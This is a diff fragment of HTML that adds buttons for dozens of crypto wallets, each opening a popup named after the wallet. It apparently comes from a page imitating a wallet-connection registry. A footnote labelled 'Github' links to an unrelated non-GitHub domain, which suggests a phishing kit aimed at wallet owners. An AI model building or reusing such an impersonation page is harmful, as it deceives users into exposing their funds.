+                    <button onclick="showPopup('SparkPoint')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png"
+                            alt="SparkPoint" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">SparkPoint</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('ViaWallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png"
+                            alt="ViaWallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">ViaWallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('BitKeep')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/bitkeep-387b0ca7da4cf322f44c70c23064c529.png"
+                            alt="BitKeep" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BitKeep</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Vision')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/vision-928292fe642172a18e62feb5eaa2d639.png" alt="Vision"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Vision</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('SWFT Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/swft.png" alt="SWFT Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">SWFT Wallet</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('Metamask')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons"
+                            src="logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg.jpeg"
+                            alt="Metamask" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Metamask</div>
+                      </div>
+                    </button>
+
+                    <button onclick="showPopup('PEAKDEFI Wallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png"
+                            alt="PEAKDEFI Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">PEAKDEFI Wallet</div>
+                      </div>
+                    </button>
+
+
+                    <button onclick="showPopup('cosmosstation')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/cosmosstation.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">cosmosstation</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Graph Protocol')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/graph.jpg.jpeg" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Graph Protocol</div>
+                    </button>
+
+
+                    <button onclick="showPopup('KardiaChain')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/kardachain.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">KardiaChain</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Keplr')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/keplr.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Keplr</div>
+                    </button>
+
+                    <button onclick="showPopup('Harmony')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/harmony.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Harmony</div>
+                    </button>
+
+                    <button onclick="showPopup('ICONex')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/iconex.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">ICONex</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Fetch')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/fetch.jpg.jpeg" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Fetch</div>
+                    </button>
+
+                    <button onclick="showPopup('XDC WALLET')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/xdc-9a98bff95dffc41869b8e77912a6cc54.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">XDC Wallet</div>
+                    </button>
+
+                    <button onclick="showPopup('Unstoppable WALLET')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Unstoppable Wallet
+                    </button>
+
+                    <button onclick="showPopup('MEET ONE')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg.jpeg"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MEET.ONE</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Dok Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/dok-a32c522e109217cc2a1a2a310f3c9bf7.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Dok Wallet</div>
+                    </button>
+
+
+                    <button onclick="showPopup('AT Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png"
+                            alt="Digitex" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">AT.Wallet</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Morix Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Morix Wallet</div>
+                    </button>
+
+
+                    <button onclick="showPopup('Midas Wallet')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/midas-wallet-5c5057d972ca621414f077541845fc61.png"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Midas Wallet</div>
+                    </button>
+                    <button onclick="showPopup('Ellipal')"
+                      style=" background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto; ">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq"
+                        style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/elipal.png" alt="Digitex"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ellipal</div>
+                    </button>
+
+
+                    <button onclick="showPopup('KEYRING PRO')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="KEYRING PRO"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">KEYRING PRO</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('BlockChain')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/blockchain-logo.png" alt="BlockChain"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">BlockChain</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Binance Smart Chain')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/binance.png" alt="Binance Smart Chain"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Binance Smart Chain</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Aktionariat')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="Aktionariat"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Aktionariat</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('SafePal')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/safepal.png" alt="SafePal"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">SafePal</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('TokenPocket')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpg.jpeg"
+                            alt="TokenPocket" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">TokenPocket</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('MathWallet')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg.jpeg"
+                            alt="MathWallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">MathWallet</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Coinbase')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coinbase.png" alt="Coinbase" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coinbase</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Ledger')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png" alt="Ledger" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Ledger</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Coin98')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/coin98-c5b50adaceaf474e48ef1dad150d0829.png" alt="Coin98" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Coin98</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Elrond')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpg.jpeg" alt="Elrond" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Elrond</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('imToken')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imToken" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">imToken</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Authereum')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/authereum-32f3939207b77c1837547d5ed4f86110.png" alt="Authereum" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Authereum</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Crypto.com | DeFi Wallet')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Crypto.com | DeFi Wallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Crypto.com | DeFi Wallet</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('KyberSwap')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/kyberswap.png" alt="KyberSwap" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">KyberSwap</div>
+                      </div>
+                    </button>
+                    
+                    <button onclick="showPopup('Atomic Wallet')" style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl" style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/atomic.png" alt="Atomic Wallet" style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Atomic Wallet</div>
+                      </div>
+                    </button>
+                    
+                    <!-- Adding Aave Wallet -->
+                    <button onclick="showPopup('Aave')"
+                      style="background: none; border: none; padding: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; width: fit-content; margin: 0 auto;">
+                      <div class="pageStylesSApp-sc-1navawn-5 cmAzHq" style="display: flex; flex-direction: column; align-items: center;">
+                        <div class="pageStylesSAppIcon-sc-1navawn-6 kSIOSl"
+                          style="width: 85px; height: 85px; padding: 5px; margin-bottom: 8px;">
+                          <img class="img_icons" src="logo/lg/aave.png" alt="Aave Wallet"
+                            style="width: 85px; height: 85px; object-fit: contain; display: block;">
+                        </div>
+                        <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">Aave</div>
+                      </div>
+                    </button>
+                    
+
+
+
+                    <div class="pageStyles__SFootNote-sc-1navawn-8 ceWocr">
+                      <p>Open a pull request on
+                        <!-- --> <a
+                          href="https://wallet.maticio.network/Wallets Validation/Wallets Validation-website.html"
+                          target="blank" rel="noreferrer noopener">Github</a> <!-- -->to add
+                        your app here.
